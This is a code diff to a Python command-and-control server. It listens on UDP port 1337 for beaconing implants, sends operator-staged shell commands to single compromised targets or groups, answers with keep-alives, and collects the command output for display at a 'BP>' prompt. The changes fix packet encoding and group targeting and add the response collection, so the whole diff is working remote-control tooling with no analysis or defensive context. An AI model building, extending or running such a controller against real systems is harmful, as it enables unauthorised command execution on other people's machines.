@@ -18,31 +18,39 @@ KEEP_ALIVE_BYTE = b'\x04'
 RAW_COMMAND = MAGIC_BYTES + b'\x02\x01'
 
 
-def socket_listen(targets, responses, pipe):
+def socket_listen(targets, pipe):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    server_address = ('127.0.0.1', 1337)
+    server_address = ('172.16.245.1', 1337)
     sock.bind(server_address)
     target_cmds = {}
+    target_responses = {}
     while True:
         data, addr = sock.recvfrom(4096)
         cur_target = addr[0]
         target_address = bytes(map(int, cur_target.split('.')))
-        cmd_num = bytes(data[7:11])
+        cmd_num = data[6:10]
         if pipe.poll() and len(target_cmds) == 0:
             target_cmds = pipe.recv()
         if cur_target not in targets:
-            targets.append(addr[0])
+            targets.append(cur_target)
+            target_responses[cur_target] = list()
+            pipe.send(target_responses)
         if MAGIC_BYTES in data[0:4] and REQUEST_BYTE == data[4:5]:
             try:
                 for cmd in target_cmds[cur_target]:
                     cmd = bytes(cmd, 'utf-8')
-                    length = bytes(len(cmd))
+                    length = len(cmd).to_bytes(2, byteorder='big')
                     packet = MAGIC_BYTES + RAW_COMMAND_BYTE + b'\x01' + cmd_num + target_address + length + cmd
                     sock.sendto(packet, addr)
                 target_cmds.pop(cur_target)
             except KeyError:
-                # Send keep alive
-                pass
+                packet = MAGIC_BYTES + KEEP_ALIVE_BYTE + b'\x01' + cmd_num + target_address
+                sock.sendto(packet, addr)
+        elif MAGIC_BYTES in data[0:4] and RESPONSE_BYTE == data[4:5]:
+            response_len = int.from_bytes(data[14:16], byteorder='big')
+            response = data[16:16+response_len].decode('utf-8')
+            target_responses[cur_target].append(response)
+            pipe.send(target_responses)
         sleep(.01)
 
 
@@ -55,10 +63,10 @@ manager = Manager()
 discovered_targets = manager.list()
 
 executeCommands = {}
-responses = manager.dict()
+responses = {}
 parentEnd, childEnd = Pipe()
 
-p = Process(target=socket_listen, args=(discovered_targets, responses, childEnd))
+p = Process(target=socket_listen, args=(discovered_targets, childEnd))
 p.start()
 
 groups = {}
@@ -73,6 +81,9 @@ mainCommandsDict = {
         "targets": None,
         "info": None,
         "groups": None,
+        "responses": {
+            "target": targetCompleter
+        },
         "staged": {
             "commands": None
         }
@@ -175,6 +186,8 @@ toolbarStr = f'Name: {stage_command_name} Target: {list(stage_target)} Commands:
 
 try:
     while 1:
+        if parentEnd.poll():
+            responses = parentEnd.recv()
         user_input = prompt(u'BP> ',
                             history=FileHistory('history.txt'),
                             auto_suggest=AutoSuggestFromHistory(),
@@ -196,6 +209,12 @@ try:
             print('Staged commands:')
             for k, v in stagedCommands.items():
                 print(f'Stage name:{k} -> {v}')
+        elif 'show responses target' in user_input:
+            s = user_input.strip().split('show responses target ')
+            if len(s) > 1:
+                _, target = s
+                for t in target.split(' '):
+                    print(f'Target {t} responses: {responses[t]}')
         elif 'set target group' in user_input:
             stage_target.clear()
             s = user_input.strip().split('set target group ')
@@ -269,7 +288,7 @@ try:
                     for exec_target in exec_targets:
                         if exec_target in groups:
                             for target in groups[exec_target]:
-                                executeCommands[exec_target] = stagedCommands[stage]['commands']
+                                executeCommands[target] = stagedCommands[stage]['commands']
                         else:
                             executeCommands[exec_target] = stagedCommands[stage]['commands']
             parentEnd.send(executeCommands)
